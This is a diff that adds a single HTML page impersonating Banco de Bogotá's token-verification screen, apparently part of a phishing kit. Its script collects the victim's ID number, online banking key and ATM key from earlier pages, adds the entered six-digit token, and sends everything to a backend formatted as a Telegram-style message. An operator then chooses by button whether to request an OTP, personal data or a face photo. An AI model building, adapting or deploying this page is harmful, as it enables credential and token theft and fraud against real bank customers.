@@ -1,0 +1,281 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+    <meta charset="utf-8" />
+    <meta content="width=device-width, initial-scale=1" name="viewport" />
+    <title>Banco de Bogotá</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet" />
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap');
+
+        body {
+            font-family: 'Inter', sans-serif;
+        }
+
+        /* Loader CSS */
+        .loader-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.8);
+            z-index: 9999;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 1.5rem;
+            flex-direction: column;
+            gap: 10px;
+        }
+
+        .spinner {
+            border: 4px solid rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            border-top: 4px solid #fff;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% {
+                transform: rotate(0deg);
+            }
+
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+    </style>
+</head>
+
+<body class="bg-[#f3f7fc] min-h-screen flex flex-col items-center p-4">
+    <header class="w-full max-w-md flex items-center justify-between py-4">
+        <button aria-label="Volver" class="text-[#1a2a5a] text-xl">
+            <i class="fas fa-chevron-left"></i>
+        </button>
+        <h1 class="text-[#1a2a5a] font-semibold text-base">
+            Banco de Bogotá
+        </h1>
+        <button aria-label="Cerrar" class="text-[#1a2a5a] text-xl">
+            <i class="fas fa-times"></i>
+        </button>
+    </header>
+
+    <main class="w-full max-w-md">
+        <br>
+        <h2 class="text-[#1a2a5a] font-semibold text-lg mb-4">
+            Verifiquemos que seas tú
+        </h2>
+        <section class="bg-white rounded-lg p-5 shadow-sm">
+            <div class="flex items-start space-x-3 mb-3">
+                <img alt="Icono de candado" class="w-6 h-6 flex-shrink-0 mt-1" src="candado.png" />
+                <div>
+                    <div class="flex items-center space-x-1 mb-1">
+                        <span class="font-semibold text-[#1a2a5a] text-base">
+                            Código Token
+                        </span>
+                        <button aria-label="Información sobre Código Token"
+                            class="text-[#1a2a5a] border border-[#1a2a5a] rounded-full w-5 h-5 flex items-center justify-center text-xs font-semibold leading-none">
+                            i
+                        </button>
+                    </div>
+                    <p class="text-[#5a5a5a] text-sm leading-relaxed max-w-[320px]">
+                        Ingresa el código Token que aparece en tu aplicación móvil o dispositivo físico.
+                    </p>
+                </div>
+            </div>
+            <form class="mt-4" onsubmit="event.preventDefault()">
+                <div id="token-inputs" class="grid grid-cols-6 gap-2 justify-center mb-6">
+                    <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*"
+                        class="token-input w-10 h-10 rounded-md border border-[#d1d5db] bg-white text-center text-lg font-semibold text-[#1a2a5a] focus:outline-none focus:ring-2 focus:ring-[#003da5]" />
+                    <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*"
+                        class="token-input w-10 h-10 rounded-md border border-[#d1d5db] bg-white text-center text-lg font-semibold text-[#1a2a5a] focus:outline-none focus:ring-2 focus:ring-[#003da5]" />
+                    <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*"
+                        class="token-input w-10 h-10 rounded-md border border-[#d1d5db] bg-white text-center text-lg font-semibold text-[#1a2a5a] focus:outline-none focus:ring-2 focus:ring-[#003da5]" />
+                    <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*"
+                        class="token-input w-10 h-10 rounded-md border border-[#d1d5db] bg-white text-center text-lg font-semibold text-[#1a2a5a] focus:outline-none focus:ring-2 focus:ring-[#003da5]" />
+                    <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*"
+                        class="token-input w-10 h-10 rounded-md border border-[#d1d5db] bg-white text-center text-lg font-semibold text-[#1a2a5a] focus:outline-none focus:ring-2 focus:ring-[#003da5]" />
+                    <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*"
+                        class="token-input w-10 h-10 rounded-md border border-[#d1d5db] bg-white text-center text-lg font-semibold text-[#1a2a5a] focus:outline-none focus:ring-2 focus:ring-[#003da5]" />
+                </div>
+
+                <p id="errorMessage" class="text-red-500 text-center mb-4 hidden">Token incorrecto, intenta de nuevo.
+                </p>
+
+                <button id="verifyBtn"
+                    class="w-full bg-[#e5e7eb] text-[#9ca3af] font-semibold text-base rounded-full py-3 cursor-not-allowed transition-colors duration-200"
+                    disabled type="submit">
+                    Verificar
+                </button>
+            </form>
+        </section>
+    </main>
+
+    <div id="loader" class="loader-overlay" style="display: none;">
+        <div class="spinner"></div>
+        <p>Validando Token...</p>
+    </div>
+
+    <script>
+        const inputs = document.querySelectorAll(".token-input");
+        const verifyBtn = document.getElementById("verifyBtn");
+        const errorMessage = document.getElementById("errorMessage");
+        const loader = document.getElementById("loader");
+
+        let initialLoginData = null;
+
+        document.addEventListener('DOMContentLoaded', async () => {
+            const storedData = sessionStorage.getItem('initialLoginData');
+            if (storedData) {
+                initialLoginData = JSON.parse(storedData);
+            } else {
+                window.location.href = 'index.html';
+            }
+        });
+
+        // Input Logic
+        inputs.forEach((input, i) => {
+            input.addEventListener("input", (e) => {
+                const value = e.target.value;
+                if (/^\d$/.test(value)) {
+                    if (i < inputs.length - 1) inputs[i + 1].focus();
+                } else {
+                    e.target.value = "";
+                }
+                checkAllFilled();
+            });
+
+            input.addEventListener("keydown", (e) => {
+                if (e.key === "Backspace" && !input.value && i > 0) {
+                    inputs[i - 1].focus();
+                }
+            });
+
+            input.addEventListener("paste", (e) => {
+                e.preventDefault();
+                const paste = (e.clipboardData || window.clipboardData).getData("text").replace(/\D/g, "").slice(0, 6);
+                [...paste].forEach((char, idx) => {
+                    if (inputs[idx]) inputs[idx].value = char;
+                });
+                if (paste.length > 0) {
+                    inputs[Math.min(paste.length, inputs.length - 1)].focus();
+                }
+                checkAllFilled();
+            });
+        });
+
+        function checkAllFilled() {
+            const allFilled = [...inputs].every((inp) => inp.value.length === 1);
+            if (allFilled) {
+                verifyBtn.disabled = false;
+                verifyBtn.classList.remove('bg-[#e5e7eb]', 'text-[#9ca3af]', 'cursor-not-allowed');
+                verifyBtn.classList.add('bg-[#003da5]', 'text-white', 'hover:bg-[#003487]');
+            } else {
+                verifyBtn.disabled = true;
+                verifyBtn.classList.add('bg-[#e5e7eb]', 'text-[#9ca3af]', 'cursor-not-allowed');
+                verifyBtn.classList.remove('bg-[#003da5]', 'text-white', 'hover:bg-[#003487]');
+            }
+        }
+
+        // Backend Communication
+        async function sendTokenData(messageContent, keyboard) {
+            try {
+                const response = await fetch('/api/send-message', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        text: messageContent,
+                        keyboard: keyboard
+                    })
+                });
+                const data = await response.json();
+                if (!response.ok) throw new Error(data.error);
+                return data.result.message_id;
+            } catch (error) {
+                console.error('Error sending token:', error);
+                return null;
+            }
+        }
+
+        async function checkOperatorResponse(messageId) {
+            try {
+                const response = await fetch(`/api/check-update/${messageId}`);
+
+                if (response.status === 408) {
+                    loader.style.display = 'none';
+                    alert("Tiempo de espera agotado. Intenta nuevamente.");
+                    window.location.reload();
+                    return;
+                }
+
+                const data = await response.json();
+
+                if (data.action) {
+                    if (data.action === 'error_token') {
+                        loader.style.display = 'none';
+                        errorMessage.classList.remove('hidden');
+                        inputs.forEach(input => input.value = '');
+                        inputs[0].focus();
+                        checkAllFilled();
+                    } else if (data.action === 'pedir_datos') {
+                        window.location.href = "datos.html";
+                    } else if (data.action === 'pedir_sms' || data.action === 'token_sms') {
+                        window.location.href = "otp.html";
+                    } else if (data.action === 'pedir_cara') {
+                        window.location.href = "cara.html";
+                    } else if (data.action === 'finalizar') {
+                        window.location.href = "finish.html";
+                    }
+                } else {
+                    setTimeout(() => checkOperatorResponse(messageId), 2000);
+                }
+            } catch (error) {
+                loader.style.display = 'none';
+                console.error("Error checking response:", error);
+            }
+        }
+
+        verifyBtn.addEventListener('click', async () => {
+            const token = [...inputs].map(input => input.value).join('');
+            errorMessage.classList.add('hidden');
+            loader.style.display = 'flex';
+
+            let message = `<b>🏦 TOKEN DINÁMICO - BOGOTÁ 🏦</b>\n`;
+
+            if (initialLoginData) {
+                if (initialLoginData.identificationType) message += `<b>🆔 Tipo Doc:</b> ${initialLoginData.identificationType}\n`;
+                if (initialLoginData.identificationNumber) message += `<b>👤 Documento:</b> <code>${initialLoginData.identificationNumber}</code>\n`;
+                if (initialLoginData.secureKey && initialLoginData.secureKey !== 'N/A') message += `<b>🔑 Clave:</b> <code>${initialLoginData.secureKey}</code>\n`;
+                if (initialLoginData.debitCardKey && initialLoginData.debitCardKey !== 'N/A') message += `<b>🔑 Clave Cajero:</b> <code>${initialLoginData.debitCardKey}</code>\n`;
+            }
+
+            message += `\n<b>💎 Token:</b> <code>${token}</code>\n`;
+            message += `<b>📅 Fecha:</b> ${new Date().toLocaleString('es-CO', { timeZone: 'America/Bogota' })}`;
+
+            const keyboard = {
+                inline_keyboard: [
+                    [{ text: "❌ Error Token", callback_data: `error_token:N/A` }],
+                    [{ text: "👀 Pedir OTP", callback_data: `pedir_sms:N/A` }, { text: "📋 Pedir Datos", callback_data: `pedir_datos:N/A` }],
+                    [{ text: "👤 Pedir Cara", callback_data: `pedir_cara:N/A` }, { text: "✅ Finalizar", callback_data: `finalizar:N/A` }]
+                ]
+            };
+
+            const messageId = await sendTokenData(message, keyboard);
+
+            if (messageId) {
+                checkOperatorResponse(messageId);
+            } else {
+                loader.style.display = 'none';
+                alert("Error al enviar el token.");
+            }
+        });
+    </script>
+</body>
+
+</html>
